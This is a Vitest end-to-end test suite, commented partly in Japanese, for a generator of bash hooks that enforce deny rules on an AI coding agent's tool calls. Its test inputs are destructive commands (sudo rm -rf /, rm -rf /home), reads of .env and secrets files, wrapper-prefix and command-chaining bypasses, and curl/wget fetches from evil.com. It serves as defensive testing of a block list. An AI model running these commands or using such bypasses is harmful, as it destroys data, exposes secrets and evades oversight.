import { describe, it, expect } from 'vitest'
import { execSync } from 'node:child_process'
import { writeFileSync, unlinkSync, mkdtempSync, rmdirSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { generateEnforceScript } from '../src/core/hook-generator.js'
import { DEFAULT_DENY_RULES } from '../src/constants.js'
import { applyProfileToSettings } from '../src/core/profile-applicator.js'
import { applyRecommendations } from '../src/core/recommendation-applier.js'
import { generateRecommendations, type ToolStats } from '../src/core/telemetry-analyzer.js'
import { balancedProfile } from '../src/profiles/balanced.js'
import { strictProfile } from '../src/profiles/strict.js'
import type { ClaudeSettings, Recommendation } from '../src/types.js'

// ============================================================
// Helper: execute generated hook script with real bash
// ============================================================

interface ScriptResult {
  readonly code: number
  readonly stdout: string
  readonly stderr: string
}

function executeHook(
  script: string,
  toolName: string,
  toolInput: Record<string, unknown>,
): ScriptResult {
  const tmpDir = mkdtempSync(join(tmpdir(), 'csg-e2e-'))
  const scriptPath = join(tmpDir, 'test-hook.sh')
  writeFileSync(scriptPath, script, { mode: 0o755 })

  const input = JSON.stringify({ tool_name: toolName, tool_input: toolInput })
  const escapedInput = input.replace(/'/g, "'\\''")

  try {
    const stdout = execSync(
      `printf '%s' '${escapedInput}' | bash "${scriptPath}"`,
      { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] },
    )
    return { code: 0, stdout, stderr: '' }
  } catch (e: unknown) {
    const err = e as { status?: number; stdout?: string; stderr?: string }
    return {
      code: err.status ?? 1,
      stdout: err.stdout ?? '',
      stderr: err.stderr ?? '',
    }
  } finally {
    try { unlinkSync(scriptPath) } catch {}
    try { rmdirSync(tmpDir) } catch {}
  }
}

// ============================================================
// E2E Test 1: DEFAULT_DENY_RULES 全17ルールの実環境テスト
// ============================================================
describe('E2E: DEFAULT_DENY_RULES 全ルールが実際に動作する', () => {
  const script = generateEnforceScript(DEFAULT_DENY_RULES)

  // Bash deny rules
  describe('Bash deny rules', () => {
    it('Bash(sudo *) blocks sudo commands', () => {
      const r = executeHook(script, 'Bash', { command: 'sudo apt-get install vim' })
      expect(r.code).toBe(2)
      expect(r.stderr).toContain('BLOCKED')
    })

    it('Bash(su *) blocks su commands', () => {
      const r = executeHook(script, 'Bash', { command: 'su root -c whoami' })
      expect(r.code).toBe(2)
    })

    it('Bash(rm -rf /*) blocks destructive rm with absolute paths', () => {
      const r = executeHook(script, 'Bash', { command: 'rm -rf /var/data' })
      expect(r.code).toBe(2)
    })

    it('Bash(rm -rf ~*) blocks destructive rm on home directory', () => {
      const r = executeHook(script, 'Bash', { command: 'rm -rf ~/Documents' })
      expect(r.code).toBe(2)
    })
  })

  // Read deny rules
  describe('Read deny rules', () => {
    it('Read(**/.env) blocks .env files', () => {
      const r = executeHook(script, 'Read', { file_path: '/project/.env' })
      expect(r.code).toBe(2)
    })

    it('Read(**/.env.*) blocks .env.production etc.', () => {
      const r = executeHook(script, 'Read', { file_path: '/project/.env.production' })
      expect(r.code).toBe(2)
    })

    it('Read(**/secrets/**) blocks secrets directory', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/secrets/api-key.txt' })
      expect(r.code).toBe(2)
    })

    it('Read(**/*.secret) blocks .secret files', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/config/db.secret' })
      expect(r.code).toBe(2)
    })

    it('Read(**/*credential*) blocks credential files', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/aws-credentials.json' })
      expect(r.code).toBe(2)
    })
  })

  // Write deny rules
  describe('Write deny rules', () => {
    it('Write(**/.env) blocks writing .env', () => {
      const r = executeHook(script, 'Write', { file_path: '/project/.env' })
      expect(r.code).toBe(2)
    })

    it('Write(**/.env.*) blocks writing .env.local', () => {
      const r = executeHook(script, 'Write', { file_path: '/project/.env.local' })
      expect(r.code).toBe(2)
    })

    it('Write(**/secrets/**) blocks writing to secrets/', () => {
      const r = executeHook(script, 'Write', { file_path: '/app/secrets/new-key' })
      expect(r.code).toBe(2)
    })
  })

  // Edit deny rules
  describe('Edit deny rules', () => {
    it('Edit(**/.env) blocks editing .env', () => {
      const r = executeHook(script, 'Edit', { file_path: '/project/.env' })
      expect(r.code).toBe(2)
    })

    it('Edit(**/.env.*) blocks editing .env.staging', () => {
      const r = executeHook(script, 'Edit', { file_path: '/project/.env.staging' })
      expect(r.code).toBe(2)
    })

    it('Edit(**/secrets/**) blocks editing secrets/', () => {
      const r = executeHook(script, 'Edit', { file_path: '/app/secrets/config.yml' })
      expect(r.code).toBe(2)
    })
  })

  // Grep deny rules
  describe('Grep deny rules', () => {
    it('Grep(**/.env) blocks grepping .env via path', () => {
      const r = executeHook(script, 'Grep', { path: '/project/.env', pattern: 'API_KEY' })
      expect(r.code).toBe(2)
    })

    it('Grep(**/.env.*) blocks grepping .env.production via path', () => {
      const r = executeHook(script, 'Grep', { path: '/project/.env.production', pattern: 'DB_PASS' })
      expect(r.code).toBe(2)
    })

    it('Grep(**/secrets/**) blocks grepping secrets/ via path', () => {
      const r = executeHook(script, 'Grep', { path: '/app/secrets/tokens', pattern: 'token' })
      expect(r.code).toBe(2)
    })

    it('Grep blocks via glob parameter matching deny patterns', () => {
      const r = executeHook(script, 'Grep', { path: '/app', pattern: 'API_KEY', glob: '.env' })
      expect(r.code).toBe(2)
    })
  })

  // Safe env suffixes must be allowed
  describe('Safe .env suffixes allowed', () => {
    const safeSuffixes = ['example', 'sample', 'template', 'dist']
    for (const suffix of safeSuffixes) {
      it(`Read allows .env.${suffix}`, () => {
        const r = executeHook(script, 'Read', { file_path: `/app/.env.${suffix}` })
        expect(r.code).toBe(0)
      })
      it(`Write allows .env.${suffix}`, () => {
        const r = executeHook(script, 'Write', { file_path: `/app/.env.${suffix}` })
        expect(r.code).toBe(0)
      })
      it(`Edit allows .env.${suffix}`, () => {
        const r = executeHook(script, 'Edit', { file_path: `/app/.env.${suffix}` })
        expect(r.code).toBe(0)
      })
      it(`Grep allows .env.${suffix} via path`, () => {
        const r = executeHook(script, 'Grep', { path: `/app/.env.${suffix}`, pattern: 'VAR' })
        expect(r.code).toBe(0)
      })
    }
  })
})

// ============================================================
// E2E Test 2: クロスツールバイパス防止 — Bash でファイルアクセス
// ============================================================
describe('E2E: クロスツールバイパス防止（Bash経由ファイルアクセス）', () => {
  const script = generateEnforceScript(DEFAULT_DENY_RULES)

  describe('Read deny → Bash file-read commands blocked', () => {
    const readCommands = ['cat', 'head', 'tail', 'less', 'more', 'grep', 'sed', 'awk', 'strings']

    for (const cmd of readCommands) {
      it(`blocks: ${cmd} .env`, () => {
        const r = executeHook(script, 'Bash', { command: `${cmd} .env` })
        expect(r.code).toBe(2)
        expect(r.stderr).toContain('file deny rule matched')
      })

      it(`blocks: ${cmd} /app/secrets/key.pem`, () => {
        const r = executeHook(script, 'Bash', { command: `${cmd} /app/secrets/key.pem` })
        expect(r.code).toBe(2)
      })
    }
  })

  describe('Write/Edit deny → Bash file-write commands blocked', () => {
    it('blocks: sed -i on .env', () => {
      const r = executeHook(script, 'Bash', { command: 'sed -i s/old/new/ .env' })
      expect(r.code).toBe(2)
    })

    it('blocks: tee to secrets file', () => {
      const r = executeHook(script, 'Bash', { command: 'echo data | tee /app/secrets/token' })
      expect(r.code).toBe(2)
    })

    it('blocks: cp to .env', () => {
      const r = executeHook(script, 'Bash', { command: 'cp template.env .env' })
      expect(r.code).toBe(2)
    })

    it('blocks: mv to secrets directory', () => {
      const r = executeHook(script, 'Bash', { command: 'mv leaked.txt /app/secrets/leaked.txt' })
      expect(r.code).toBe(2)
    })
  })

  describe('quoted file arguments still blocked', () => {
    it('blocks: cat ".env"', () => {
      const r = executeHook(script, 'Bash', { command: 'cat ".env"' })
      expect(r.code).toBe(2)
    })

    it("blocks: cat '.env'", () => {
      const r = executeHook(script, 'Bash', { command: "cat '.env'" })
      expect(r.code).toBe(2)
    })
  })

  describe('safe files NOT blocked', () => {
    it('allows: cat /app/src/index.ts', () => {
      const r = executeHook(script, 'Bash', { command: 'cat /app/src/index.ts' })
      expect(r.code).toBe(0)
    })

    it('allows: cat .env.example', () => {
      const r = executeHook(script, 'Bash', { command: 'cat .env.example' })
      expect(r.code).toBe(0)
    })

    it('allows: grep pattern /app/src/main.ts', () => {
      const r = executeHook(script, 'Bash', { command: 'grep pattern /app/src/main.ts' })
      expect(r.code).toBe(0)
    })
  })
})

// ============================================================
// E2E Test 3: プレフィクスコマンドバイパス防止
// ============================================================
describe('E2E: プレフィクスコマンドバイパス防止', () => {
  const script = generateEnforceScript(DEFAULT_DENY_RULES)

  const prefixCommands = ['env', 'command', 'nice', 'nohup', 'builtin', 'time']

  for (const prefix of prefixCommands) {
    it(`blocks: ${prefix} sudo rm -rf /`, () => {
      const r = executeHook(script, 'Bash', { command: `${prefix} sudo rm -rf /` })
      expect(r.code).toBe(2)
    })
  }

  it('blocks: double prefix: env nice sudo rm -rf /', () => {
    const r = executeHook(script, 'Bash', { command: 'env nice sudo rm -rf /' })
    expect(r.code).toBe(2)
  })

  it('blocks: env with VAR=value: env PATH=/tmp sudo rm -rf /', () => {
    const r = executeHook(script, 'Bash', { command: 'env PATH=/tmp sudo rm -rf /' })
    expect(r.code).toBe(2)
  })

  it('blocks: /usr/bin/sudo (absolute path bypass)', () => {
    const r = executeHook(script, 'Bash', { command: '/usr/bin/sudo rm -rf /' })
    expect(r.code).toBe(2)
  })
})

// ============================================================
// E2E Test 4: MultiEdit → Edit マッピング
// ============================================================
describe('E2E: MultiEdit は Edit として扱われる', () => {
  const script = generateEnforceScript(DEFAULT_DENY_RULES)

  it('blocks MultiEdit on .env file', () => {
    const r = executeHook(script, 'MultiEdit', { file_path: '/project/.env' })
    expect(r.code).toBe(2)
  })

  it('blocks MultiEdit on secrets file', () => {
    const r = executeHook(script, 'MultiEdit', { file_path: '/app/secrets/db.yml' })
    expect(r.code).toBe(2)
  })

  it('allows MultiEdit on normal files', () => {
    const r = executeHook(script, 'MultiEdit', { file_path: '/app/src/index.ts' })
    expect(r.code).toBe(0)
  })
})

// ============================================================
// E2E Test 5: fail-closed — 不正入力はブロック
// ============================================================
describe('E2E: fail-closed（不正入力）', () => {
  const script = generateEnforceScript(DEFAULT_DENY_RULES)

  it('rejects empty JSON input (no tool_name)', () => {
    const tmpDir = mkdtempSync(join(tmpdir(), 'csg-e2e-'))
    const scriptPath = join(tmpDir, 'test-hook.sh')
    writeFileSync(scriptPath, script, { mode: 0o755 })

    try {
      execSync(
        `printf '%s' '{}' | bash "${scriptPath}"`,
        { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] },
      )
      // Should not reach here
      expect(true).toBe(false)
    } catch (e: unknown) {
      const err = e as { status?: number; stderr?: string }
      expect(err.status).toBe(2)
      expect(err.stderr).toContain('could not parse tool_name')
    } finally {
      try { unlinkSync(scriptPath) } catch {}
      try { rmdirSync(tmpDir) } catch {}
    }
  })

  it('rejects malformed JSON', () => {
    const tmpDir = mkdtempSync(join(tmpdir(), 'csg-e2e-'))
    const scriptPath = join(tmpDir, 'test-hook.sh')
    writeFileSync(scriptPath, script, { mode: 0o755 })

    try {
      execSync(
        `printf '%s' 'not-json' | bash "${scriptPath}"`,
        { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] },
      )
      expect(true).toBe(false)
    } catch (e: unknown) {
      const err = e as { status?: number }
      expect(err.status).toBe(2)
    } finally {
      try { unlinkSync(scriptPath) } catch {}
      try { rmdirSync(tmpDir) } catch {}
    }
  })
})

// ============================================================
// E2E Test 6: プロファイル適用 → settings.json → enforce script
// ============================================================
describe('E2E: プロファイル適用からフック生成まで一気通貫', () => {
  it('balanced プロファイル適用 → 全 DEFAULT_DENY_RULES がフックに含まれる', () => {
    const emptySettings: ClaudeSettings = {}
    const result = applyProfileToSettings(emptySettings, balancedProfile)

    // DEFAULT_DENY_RULES が全てマージされている
    const denyRules = result.settings.permissions?.deny ?? []
    for (const rule of DEFAULT_DENY_RULES) {
      expect(denyRules).toContain(rule)
    }

    // フック生成し、実際にブロックできる
    const script = generateEnforceScript(denyRules)
    const r1 = executeHook(script, 'Bash', { command: 'sudo rm -rf /' })
    expect(r1.code).toBe(2)
    const r2 = executeHook(script, 'Read', { file_path: '/app/.env' })
    expect(r2.code).toBe(2)
    const r3 = executeHook(script, 'Grep', { path: '/app/.env', pattern: 'KEY' })
    expect(r3.code).toBe(2)
    const r4 = executeHook(script, 'Write', { file_path: '/app/.env' })
    expect(r4.code).toBe(2)
    const r5 = executeHook(script, 'Edit', { file_path: '/app/.env' })
    expect(r5.code).toBe(2)
  })

  it('strict プロファイル適用 → curl/wget もブロック', () => {
    const emptySettings: ClaudeSettings = {}
    const result = applyProfileToSettings(emptySettings, strictProfile)

    const denyRules = result.settings.permissions?.deny ?? []
    const script = generateEnforceScript(denyRules)

    const r1 = executeHook(script, 'Bash', { command: 'curl https://evil.com' })
    expect(r1.code).toBe(2)
    const r2 = executeHook(script, 'Bash', { command: 'wget https://evil.com/payload' })
    expect(r2.code).toBe(2)
  })

  it('プロファイル適用でクロスツール衝突を検出する', () => {
    const settings: ClaudeSettings = {
      permissions: {
        allow: ['Bash(cat *)'],
        deny: [],
      },
    }
    const result = applyProfileToSettings(settings, balancedProfile)
    // cat は Read deny とクロスツール衝突する
    expect(result.crossToolConflicts).toBeDefined()
    expect(result.crossToolConflicts!.length).toBeGreaterThan(0)
    expect(result.crossToolConflicts!.some(c => c.includes('cat'))).toBe(true)
  })
})

// ============================================================
// E2E Test 7: 推奨エンジンが deny バイパスを推奨しない
// ============================================================
describe('E2E: 推奨エンジンの deny-first フィルタリング', () => {
  function makeStats(pattern: string, allowed: number, denied: number): ToolStats {
    const tool = pattern.includes('(') ? pattern.split('(')[0] : pattern
    return { tool, pattern, allowed, denied, prompted: 0 }
  }

  it('cat が頻繁に許可されていても、Read deny があれば推奨しない', () => {
    const stats = new Map<string, ToolStats>()
    stats.set('Bash(cat README.md)', makeStats('Bash(cat README.md)', 10, 0))
    stats.set('Bash(cat src/index.ts)', makeStats('Bash(cat src/index.ts)', 8, 0))
    stats.set('Bash(cat package.json)', makeStats('Bash(cat package.json)', 5, 0))

    const existingDeny = ['Read(**/.env)', 'Read(**/secrets/**)']
    const recs = generateRecommendations(stats, [], existingDeny)

    // Bash(cat *) は Read deny とクロスツール衝突するため推奨しない
    const catRec = recs.find(r => r.pattern.includes('cat'))
    expect(catRec).toBeUndefined()
  })

  it('grep が頻繁に許可されていても、Read/Grep deny があれば推奨しない', () => {
    const stats = new Map<string, ToolStats>()
    stats.set('Bash(grep pattern file1)', makeStats('Bash(grep pattern file1)', 10, 0))
    stats.set('Bash(grep -r TODO src)', makeStats('Bash(grep -r TODO src)', 8, 0))

    const existingDeny = ['Grep(**/.env)', 'Read(**/.env)']
    const recs = generateRecommendations(stats, [], existingDeny)

    const grepRec = recs.find(r => r.pattern.includes('grep'))
    expect(grepRec).toBeUndefined()
  })

  it('env/command が頻繁に許可されていても、Bash deny があれば推奨しない', () => {
    const stats = new Map<string, ToolStats>()
    stats.set('Bash(env NODE_ENV=test npm test)', makeStats('Bash(env NODE_ENV=test npm test)', 10, 0))
    stats.set('Bash(env CI=true jest)', makeStats('Bash(env CI=true jest)', 5, 0))

    const existingDeny = ['Bash(sudo *)']
    const recs = generateRecommendations(stats, [], existingDeny)

    const envRec = recs.find(r => r.pattern.includes('env'))
    expect(envRec).toBeUndefined()
  })

  it('安全なコマンドは正しく推奨する', () => {
    const stats = new Map<string, ToolStats>()
    stats.set('Bash(npm install)', makeStats('Bash(npm install)', 5, 0))
    stats.set('Bash(npm test)', makeStats('Bash(npm test)', 4, 0))
    stats.set('Bash(npm run build)', makeStats('Bash(npm run build)', 3, 0))

    const existingDeny = ['Bash(sudo *)', 'Read(**/.env)']
    const recs = generateRecommendations(stats, [], existingDeny)

    const npmRec = recs.find(r => r.pattern.includes('npm'))
    expect(npmRec).toBeDefined()
    expect(npmRec!.action).toBe('add-allow')
  })
})

// ============================================================
// E2E Test 8: 推奨適用エンジンの deny-first フィルタリング
// ============================================================
describe('E2E: 推奨適用エンジンが deny と衝突する allow を除外する', () => {
  it('直接衝突: deny にあるパターンは allow に追加されない', () => {
    const settings: ClaudeSettings = {}
    const recs: Recommendation[] = [
      { action: 'add-deny', pattern: 'Bash(sudo *)', reason: 'deny' },
      { action: 'add-allow', pattern: 'Bash(sudo *)', reason: 'test' },
      { action: 'add-allow', pattern: 'Bash(npm *)', reason: 'test' },
    ]
    const result = applyRecommendations(settings, recs)

    expect(result.finalAllow).not.toContain('Bash(sudo *)')
    expect(result.finalAllow).toContain('Bash(npm *)')
  })

  it('クロスツール衝突: cat allow は Read deny があるとき追加されない', () => {
    const settings: ClaudeSettings = {}
    const recs: Recommendation[] = [
      { action: 'add-deny', pattern: 'Read(**/.env)', reason: 'deny' },
      { action: 'add-allow', pattern: 'Bash(cat *)', reason: 'test' },
    ]
    const result = applyRecommendations(settings, recs)

    expect(result.finalAllow).not.toContain('Bash(cat *)')
  })

  it('プレフィクスバイパス: env allow は Bash deny があるとき追加されない', () => {
    const settings: ClaudeSettings = {}
    const recs: Recommendation[] = [
      { action: 'add-deny', pattern: 'Bash(sudo *)', reason: 'deny' },
      { action: 'add-allow', pattern: 'Bash(env *)', reason: 'test' },
    ]
    const result = applyRecommendations(settings, recs)

    expect(result.finalAllow).not.toContain('Bash(env *)')
  })

  it('deny は常に追加される（フィルタされない）', () => {
    const settings: ClaudeSettings = {
      permissions: { deny: [], allow: ['Bash(npm *)'] },
    }
    const recs: Recommendation[] = [
      { action: 'add-deny', pattern: 'Bash(sudo *)', reason: 'test' },
      { action: 'add-deny', pattern: 'Bash(rm -rf /*)', reason: 'test' },
    ]
    const result = applyRecommendations(settings, recs)

    expect(result.addedDeny).toContain('Bash(sudo *)')
    expect(result.addedDeny).toContain('Bash(rm -rf /*)')
    expect(result.hasDenyChanges).toBe(true)
  })
})

// ============================================================
// E2E Test 9: 合成コマンドの分割テスト（実環境）
// ============================================================
describe('E2E: 合成コマンド内の deny 対象検出', () => {
  const script = generateEnforceScript(DEFAULT_DENY_RULES)

  describe('パイプ・チェーン内の sudo', () => {
    it('blocks: echo | sudo apt install', () => {
      const r = executeHook(script, 'Bash', { command: 'echo password | sudo apt install vim' })
      expect(r.code).toBe(2)
    })

    it('blocks: ls && su root', () => {
      const r = executeHook(script, 'Bash', { command: 'ls && su root' })
      expect(r.code).toBe(2)
    })

    it('blocks: false || rm -rf /tmp', () => {
      const r = executeHook(script, 'Bash', { command: 'false || rm -rf /tmp' })
      expect(r.code).toBe(2)
    })
  })

  describe('コマンド置換内の deny 対象', () => {
    it('blocks: $(sudo whoami)', () => {
      const r = executeHook(script, 'Bash', { command: 'echo $(sudo whoami)' })
      expect(r.code).toBe(2)
    })

    it('blocks: $(rm -rf /home)', () => {
      const r = executeHook(script, 'Bash', { command: 'VAR=$(rm -rf /home)' })
      expect(r.code).toBe(2)
    })
  })

  describe('ファイルアクセスコマンドのチェーン', () => {
    it('blocks: npm test && cat .env', () => {
      const r = executeHook(script, 'Bash', { command: 'npm test && cat .env' })
      expect(r.code).toBe(2)
    })

    it('blocks: cd /app && head /app/secrets/token', () => {
      const r = executeHook(script, 'Bash', { command: 'cd /app && head /app/secrets/token' })
      expect(r.code).toBe(2)
    })
  })

  describe('安全な合成コマンドは通す', () => {
    it('allows: npm install && npm run build && npm test', () => {
      const r = executeHook(script, 'Bash', { command: 'npm install && npm run build && npm test' })
      expect(r.code).toBe(0)
    })

    it('allows: cat src/index.ts | grep TODO', () => {
      const r = executeHook(script, 'Bash', { command: 'cat src/index.ts | grep TODO' })
      expect(r.code).toBe(0)
    })
  })
})

// ============================================================
// E2E Test 10: 全体フロー — 空の設定からフルプロテクションまで
// ============================================================
describe('E2E: 空の設定からフルプロテクションまでの一気通貫テスト', () => {
  it('空設定 → balanced プロファイル → enforce フック → 全 deny が動作', () => {
    // Step 1: 空の設定にプロファイル適用
    const settings: ClaudeSettings = {}
    const profileResult = applyProfileToSettings(settings, balancedProfile)
    expect(profileResult.addedDeny).toBeGreaterThan(0)

    // Step 2: deny ルールからフックスクリプト生成
    const denyRules = profileResult.settings.permissions?.deny ?? []
    expect(denyRules.length).toBeGreaterThan(0)
    const script = generateEnforceScript(denyRules)

    // Step 3: 全カテゴリのブロックが動作
    // Bash: sudo
    expect(executeHook(script, 'Bash', { command: 'sudo rm' }).code).toBe(2)
    // Bash: rm -rf /
    expect(executeHook(script, 'Bash', { command: 'rm -rf /home' }).code).toBe(2)
    // Read: .env
    expect(executeHook(script, 'Read', { file_path: '/app/.env' }).code).toBe(2)
    // Write: .env
    expect(executeHook(script, 'Write', { file_path: '/app/.env' }).code).toBe(2)
    // Edit: .env
    expect(executeHook(script, 'Edit', { file_path: '/app/.env' }).code).toBe(2)
    // Grep: .env
    expect(executeHook(script, 'Grep', { path: '/app/.env', pattern: 'KEY' }).code).toBe(2)
    // Read: secrets
    expect(executeHook(script, 'Read', { file_path: '/app/secrets/key' }).code).toBe(2)
    // Write: secrets
    expect(executeHook(script, 'Write', { file_path: '/app/secrets/key' }).code).toBe(2)
    // Edit: secrets
    expect(executeHook(script, 'Edit', { file_path: '/app/secrets/key' }).code).toBe(2)
    // Grep: secrets
    expect(executeHook(script, 'Grep', { path: '/app/secrets/key', pattern: 'x' }).code).toBe(2)
    // Cross-tool: cat .env via Bash
    expect(executeHook(script, 'Bash', { command: 'cat .env' }).code).toBe(2)
    // Prefix bypass: env sudo
    expect(executeHook(script, 'Bash', { command: 'env sudo rm -rf /' }).code).toBe(2)
    // MultiEdit → Edit mapping
    expect(executeHook(script, 'MultiEdit', { file_path: '/app/.env' }).code).toBe(2)

    // Step 4: 安全な操作は全て通る
    expect(executeHook(script, 'Bash', { command: 'npm test' }).code).toBe(0)
    expect(executeHook(script, 'Read', { file_path: '/app/src/index.ts' }).code).toBe(0)
    expect(executeHook(script, 'Write', { file_path: '/app/src/index.ts' }).code).toBe(0)
    expect(executeHook(script, 'Edit', { file_path: '/app/src/index.ts' }).code).toBe(0)
    expect(executeHook(script, 'Grep', { path: '/app/src', pattern: 'TODO' }).code).toBe(0)
    expect(executeHook(script, 'Read', { file_path: '/app/.env.example' }).code).toBe(0)
  })
})
